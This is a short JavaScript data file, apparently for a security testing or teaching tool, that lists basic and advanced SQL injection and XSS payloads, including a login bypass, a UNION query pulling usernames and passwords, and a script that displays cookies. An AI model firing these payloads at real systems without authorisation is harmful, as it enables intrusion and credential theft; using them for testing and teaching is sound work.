export const payloadGroups = [
  {
    id: "sqli-basic",
    title: "SQLi Basic",
    tone: "tone-sqli-basic",
    items: [
      "' OR '1'='1",
      "admin'--",
      "' OR 1=1--"
    ]
  },
  {
    id: "sqli-advanced",
    title: "SQLi Advanced",
    tone: "tone-sqli-advanced",
    items: [
      "' UNION SELECT username,password FROM users--",
      "' AND (SELECT COUNT(*) FROM users)>0--",
      "' OR 'a'='a' /*"
    ]
  },
  {
    id: "xss-basic",
    title: "XSS Basic",
    tone: "tone-xss-basic",
    items: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<b>hello</b>"
    ]
  },
  {
    id: "xss-advanced",
    title: "XSS Advanced",
    tone: "tone-xss-advanced",
    items: [
      "<svg onload=alert(1)>",
      "\"><script>alert(document.cookie)</script>",
      "javascript:alert(1)"
    ]
  }
];
